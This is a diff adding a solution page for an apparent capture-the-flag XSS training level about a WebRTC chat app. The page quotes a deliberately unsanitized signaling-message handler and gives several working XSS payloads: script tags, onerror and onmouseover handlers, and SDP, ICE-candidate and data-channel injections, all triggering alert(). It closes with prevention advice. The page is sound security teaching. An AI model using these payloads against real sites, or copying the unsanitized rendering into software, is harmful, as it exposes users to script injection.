@@ -1,0 +1,180 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 20 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 20 Solution: XSS in WebRTC Applications</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how WebRTC applications can be vulnerable to XSS attacks through their signaling mechanisms. The WebRTC Chat application allows users to exchange messages during video calls, but has a vulnerability in how it processes and displays signaling messages.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to exploit the vulnerable signaling message processing mechanism by injecting JavaScript code that will be executed when the message is displayed.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>The vulnerability lies in how the application processes signaling messages. Looking at the code, we can see that it parses the message as JSON and then directly renders the content without sanitization:</p>
+                        <pre class="bg-light p-3 rounded"><code>// Process a signaling message (vulnerable to XSS)
+processSignalingMessage(message) {
+    try {
+        // In a real WebRTC application, this would process SDP offers, answers, and ICE candidates
+        // For this simulation, we'll just parse the message as JSON and display it
+        
+        // This is the vulnerable part - it doesn't properly sanitize the message content
+        // before rendering it in the DOM
+        const parsedMessage = JSON.parse(message);
+        
+        if (parsedMessage.type === 'chat') {
+            // This is vulnerable to XSS because it directly renders the message content
+            this.receiveMessage({
+                sender: parsedMessage.sender || 'System',
+                content: parsedMessage.content,
+                timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+            });
+            return true;
+        }
+        
+        return false;
+    } catch (error) {
+        console.error('Error processing signaling message:', error);
+        return false;
+    }
+}</code></pre>
+                        <p>This means that any HTML or JavaScript in the message content will be executed when the message is rendered. The application also provides a special command for sending signaling messages: <code>/signal [JSON message]</code>.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Crafting the Payload</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit this vulnerability, we need to craft a payload that will be processed as a signaling message and executed when rendered. Here are several approaches:</p>
+                        
+                        <h6>Method 1: Basic Script Tag in JSON</h6>
+                        <pre class="bg-light p-3 rounded"><code>/signal {"type":"chat","sender":"Hacker","content":"&lt;script&gt;alert('XSS Level 20 Completed!')&lt;/script&gt;"}</code></pre>
+                        <p>This payload creates a chat message with a script tag in the content, which will be executed when the message is rendered.</p>
+                        
+                        <h6>Method 2: Event Handler in JSON</h6>
+                        <pre class="bg-light p-3 rounded"><code>/signal {"type":"chat","sender":"Hacker","content":"&lt;img src='x' onerror='alert(\"XSS Level 20 Completed!\")'&gt;"}</code></pre>
+                        <p>This payload creates a chat message with an image that has an invalid source, triggering the onerror event handler which executes our JavaScript.</p>
+                        
+                        <h6>Method 3: Inline JavaScript in JSON</h6>
+                        <pre class="bg-light p-3 rounded"><code>/signal {"type":"chat","sender":"Hacker","content":"&lt;div onmouseover='alert(\"XSS Level 20 Completed!\")' style='display:block;width:100%;height:50px;background:#f0f0f0;'&gt;Hover over me to trigger the XSS&lt;/div&gt;"}</code></pre>
+                        <p>This payload creates a chat message with a div that has an onmouseover event handler, which executes our JavaScript when the user hovers over it.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step-by-Step Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>
+                                <p>Open the WebRTC Chat application and locate the chat input field at the bottom of the page.</p>
+                            </li>
+                            <li>
+                                <p>Enter one of the XSS payloads using the <code>/signal</code> command:</p>
+                                <pre class="bg-light p-3 rounded"><code>/signal {"type":"chat","sender":"Hacker","content":"&lt;script&gt;alert('XSS Level 20 Completed!')&lt;/script&gt;"}</code></pre>
+                            </li>
+                            <li>
+                                <p>Press Enter or click the Send button to send the signaling message.</p>
+                            </li>
+                            <li>
+                                <p>The application will process the signaling message and display it in the chat.</p>
+                            </li>
+                            <li>
+                                <p>When the message is rendered, the XSS payload will be executed, displaying the alert message "XSS Level 20 Completed!".</p>
+                            </li>
+                            <li>
+                                <p>When the alert appears, the challenge will be solved and the flag will be revealed.</p>
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>WebRTC-Specific Exploitation Techniques</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>In a real WebRTC application, there are additional exploitation techniques that could be used:</p>
+                        
+                        <h6>1. SDP Offer/Answer Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>/signal {"type":"offer","sdp":"v=0\r\no=- 1234567890 1 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\na=group:BUNDLE audio video\r\na=msid-semantic: WMS\r\nm=audio 9 UDP/TLS/RTP/SAVPF 111\r\nc=IN IP4 0.0.0.0\r\na=rtcp:9 IN IP4 0.0.0.0\r\na=ice-ufrag:&lt;script&gt;alert('XSS Level 20 Completed!')&lt;/script&gt;\r\na=ice-pwd:asd\r\na=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99\r\na=setup:actpass\r\na=mid:audio\r\na=sendrecv\r\na=rtcp-mux\r\na=rtpmap:111 opus/48000/2\r\na=fmtp:111 minptime=10;useinbandfec=1\r\n"}</code></pre>
+                        <p>This payload attempts to inject a script tag into the SDP offer, which might be rendered without proper sanitization in some WebRTC applications.</p>
+                        
+                        <h6>2. ICE Candidate Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>/signal {"type":"candidate","candidate":"candidate:1 1 UDP 2130706431 &lt;script&gt;alert('XSS Level 20 Completed!')&lt;/script&gt; 8998 typ host"}</code></pre>
+                        <p>This payload attempts to inject a script tag into an ICE candidate, which might be rendered without proper sanitization in some WebRTC applications.</p>
+                        
+                        <h6>3. Data Channel Message Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>/signal {"type":"datachannel","channel":"chat","message":"&lt;img src=x onerror=alert('XSS Level 20 Completed!')&gt;"}</code></pre>
+                        <p>This payload attempts to inject an XSS payload into a data channel message, which might be rendered without proper sanitization in some WebRTC applications.</p>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Unsafe Content Rendering:</strong> The application renders user-supplied content without sanitization, allowing XSS attacks.</li>
+                            <li><strong>Insufficient Input Validation:</strong> The application doesn't properly validate or sanitize signaling messages before processing them.</li>
+                            <li><strong>Trust in Client-Side Data:</strong> The application trusts data received from the peer, which can be manipulated by an attacker.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Content Sanitization:</strong> Always sanitize user-supplied content before rendering it in the DOM. Use libraries like DOMPurify to remove potentially malicious content.</li>
+                            <li><strong>Safe DOM Manipulation:</strong> Use <code>textContent</code> instead of <code>innerHTML</code> when rendering user-supplied content, or use a framework that automatically escapes HTML.</li>
+                            <li><strong>Input Validation:</strong> Validate all user input and signaling messages to ensure they conform to expected formats and don't contain malicious code.</li>
+                            <li><strong>WebRTC-Specific Protections:</strong>
+                                <ul>
+                                    <li>Validate SDP offers and answers before processing them</li>
+                                    <li>Sanitize ICE candidate information before displaying it</li>
+                                    <li>Use a secure signaling server that validates and sanitizes messages</li>
+                                    <li>Implement proper authentication and authorization for WebRTC connections</li>
+                                    <li>Consider using end-to-end encryption for data channels</li>
+                                </ul>
+                            </li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to mitigate the impact of XSS vulnerabilities.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            WebRTC is increasingly used for video conferencing, telehealth, online education, and other critical applications. In real-world scenarios, XSS vulnerabilities in WebRTC applications can be particularly dangerous because:
+                        </p>
+                        <ul>
+                            <li>They can lead to unauthorized access to camera and microphone feeds</li>
+                            <li>They can allow attackers to eavesdrop on sensitive conversations</li>
+                            <li>They can compromise the confidentiality of peer-to-peer communications</li>
+                            <li>They can be used to steal sensitive information shared during video calls</li>
+                            <li>They can be difficult to detect due to the peer-to-peer nature of WebRTC</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level20') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
